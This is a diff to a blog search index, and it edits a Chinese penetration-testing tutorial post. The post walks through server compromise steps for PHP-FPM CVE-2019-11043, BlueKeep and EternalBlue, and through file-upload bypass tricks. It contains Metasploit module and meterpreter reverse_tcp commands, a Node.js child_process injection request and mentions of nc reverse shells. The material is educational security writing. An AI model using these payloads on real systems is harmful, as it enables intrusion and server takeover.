@@ -5393,7 +5393,7 @@
     <content><![CDATA[<h2 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h2><h3 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>1、真实IP、开放端口、管理后台、web应用、子域名、中间件以及版本信息、其他…</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>cve漏洞，上传漏洞，Sql注入、XSS，CSRF，逻辑漏洞，跨域漏洞等组合获取服务器权限</p>
 <hr>
-<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>提权（低权限用户提升至root/System权限）、权限维持、docker逃逸、反向代理、内网资产绘制、横向渗透</p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>权限维持、提权（低权限用户提升至root/System权限）、docker逃逸、反向代理、内网资产绘制、横向渗透</p>
 <hr>
 <h3 id="POC、EXP"><a href="#POC、EXP" class="headerlink" title="POC、EXP"></a>POC、EXP</h3><p>POC：全称 ‘ Proof of Concept ‘，中文 ‘ 概念验证 ‘ ，常指一段漏洞证明的代码。</p>
 <p>EXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。</p>
@@ -5402,8 +5402,6 @@
 <h2 id="服务器为什么会被远程控制"><a href="#服务器为什么会被远程控制" class="headerlink" title="服务器为什么会被远程控制"></a>服务器为什么会被远程控制</h2><p><strong>弱口令+后台任意文件上传</strong></p>
 <p><em>如何上传对应的小马呢？</em></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#按URL划分</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.asp?id&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.php?id&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;example.com&#x2F;1.jsp?id&#x3D;1</span><br></pre></td></tr></table></figure>
-
-
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#按web服务划分</span><br><span class="line">Nginx和Apache：php </span><br><span class="line"></span><br><span class="line">Tomcat(java): jsp ,jspx</span><br><span class="line"></span><br><span class="line">IIS :aspx ,ashx ,asp ,asa ,cer ,cdx</span><br></pre></td></tr></table></figure>
 <p><strong>中间件版本/配置存在漏洞</strong></p>
 <p><em>部分中间件在特定版本之前都存在通用漏洞。</em></p>
@@ -5420,7 +5418,9 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;checkValid HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.35.129</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line"></span><br><span class="line">document&#x3D;this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
 <p>nc监听get shell</p>
 <h3 id="PHP远程代码执行漏洞复现（CVE-2019-11043）"><a href="#PHP远程代码执行漏洞复现（CVE-2019-11043）" class="headerlink" title="PHP远程代码执行漏洞复现（CVE-2019-11043）"></a>PHP远程代码执行漏洞复现（CVE-2019-11043）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nginx.conf</span><br><span class="line"></span><br><span class="line">1 location ~ [^&#x2F;]\.php(&#x2F;|$) &#123;</span><br><span class="line">2  ...</span><br><span class="line">3  fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br><span class="line">4  fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">5  fastcgi_pass   php:9000;</span><br><span class="line">6  ...</span><br><span class="line">7 &#125;</span><br></pre></td></tr></table></figure>
 <p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。</p>
+<p><em>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器.PHP-FPM提供了更好的PHP进程管理]方式，可以有效控制内存和进程、可以平滑重载PHP配置</em></p>
 <h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><ul>
 <li>PHP 7.0 版本</li>
 <li>PHP 7.1 版本</li>
@@ -5428,15 +5428,61 @@
 <li>PHP 7.3 版本</li>
 </ul>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>构建环境，查看是否正常运行；</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.35.129:8080&#x2F;index.php</span><br></pre></td></tr></table></figure>
 <p>运行exp文件，访问web的index.php?a=whoami测试；</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/09/08/fR4AKz7hWdBTJP2.png" alt="php-exp"></p>
 <p>公网服务器使用 nc 监听端口；</p>
 <p>web执行nc命令或bash一句话；</p>
 <p>getshell ~</p>
-<h3 id="CVE-2019-0708漏洞复现"><a href="#CVE-2019-0708漏洞复现" class="headerlink" title="CVE-2019-0708漏洞复现"></a>CVE-2019-0708漏洞复现</h3><p>有可能蓝屏，有可能get shell</p>
-<h3 id="ms17-010（永恒之蓝）"><a href="#ms17-010（永恒之蓝）" class="headerlink" title="ms17-010（永恒之蓝）"></a>ms17-010（永恒之蓝）</h3><p>win7开启445端口可以直接get shell</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h2 id="拿到服务器以后的目的"><a href="#拿到服务器以后的目的" class="headerlink" title="拿到服务器以后的目的"></a>拿到服务器以后的目的</h2><p>收集完这一台服务器的信息后就跑路了吗？NO</p>
+<h3 id="CVE-2019-0708远程桌面代码执行漏洞复现"><a href="#CVE-2019-0708远程桌面代码执行漏洞复现" class="headerlink" title="CVE-2019-0708远程桌面代码执行漏洞复现"></a>CVE-2019-0708远程桌面代码执行漏洞复现</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏洞和2017年的永恒之蓝病毒有类似之处。</p>
+<p><em>利用此漏洞前置条件是符合影响的系统版本，没有打相对应的漏洞补丁。并且开启了3389端口。</em></p>
+<h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows 7</p>
+<p>Windows server 2008 R2</p>
+<p>Windows server 2008</p>
+<p>Windows 2003</p>
+<p>Windows xp</p>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>确定了受害机后，在攻击机端进入msf环境；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">msfconsole</span></span><br></pre></td></tr></table></figure>
+<p>搜索对应cve-2019-0708的利用脚本；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">search 0708</span></span><br></pre></td></tr></table></figure>
+<p>验证确认存在漏洞后使用攻击模块；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span></span><br></pre></td></tr></table></figure>
+<p>设置参数、payload并利用；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">show options</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span></span><br></pre></td></tr></table></figure>
+<p>有可能蓝屏，有可能反弹回shell。</p>
+<h3 id="ms17-010（永恒之蓝）"><a href="#ms17-010（永恒之蓝）" class="headerlink" title="ms17-010（永恒之蓝）"></a>ms17-010（永恒之蓝）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。</p>
+<p>SMB服务的作用：该服务在Windows与UNIX系列的OS之间搭起一座桥梁，让两者的资源可互通有无。</p>
+<h4 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows XP</p>
+<p>Windows Vista</p>
+<p>Windows 7</p>
+<p>Windows 8.1</p>
+<p>Windows 10</p>
+<p>Windows Server 2003</p>
+<p>Windows Server 2008</p>
+<p>Windows Server2008 R2</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2016</p>
+<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用msf</p>
+<p>搜索ms17-010</p>
+<p>设置payload，使用exp</p>
+<p>getshell</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p>上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。</p>
+<h4 id="造成的危害"><a href="#造成的危害" class="headerlink" title="造成的危害"></a>造成的危害</h4><p>导致网站甚至整个服务器被控制。</p>
+<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>收集网站信息，寻找文件上传点；</p>
+<p>确认网站是php还是asp还是jsp等类型；</p>
+<p>上传小马，如果上传失败尝试绕过；</p>
+<p>常见的绕过方式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前端js检查绕过;</span><br><span class="line">黑名单绕过;</span><br><span class="line">大小写绕过;</span><br><span class="line">点绕过;</span><br><span class="line">空格绕过;</span><br><span class="line">双写绕过;</span><br><span class="line">00截断(php版本小于5.3.4);</span><br><span class="line">图片马绕过;</span><br><span class="line">条件竞争绕过;</span><br></pre></td></tr></table></figure>
+<p>针对中间件的绕过方式</p>
+<p>IIS文件解析漏洞;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;test.asp&#x2F;test.jpg</span><br><span class="line">test.asp;.jpg</span><br></pre></td></tr></table></figure>
+<p>tomcat：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.war</span><br><span class="line">#解析后是test&#x2F;test.jsp</span><br></pre></td></tr></table></figure>
+<p>上传成功后，使用连接器连接小马，getshell</p>
+<h2 id="拿到服务器以后的目的"><a href="#拿到服务器以后的目的" class="headerlink" title="拿到服务器以后的目的"></a>拿到服务器以后的目的</h2><p>收集完这一台服务器的信息后会做什么，跑路吗？</p>
 <p>反向代理，进入内网环境，横向渗透</p>
-<p>这也就是为什么企业上云更安全的原因</p>
+<p>企业上云更安全</p>
 ]]></content>
       <categories>
         <category>技术分享</category>
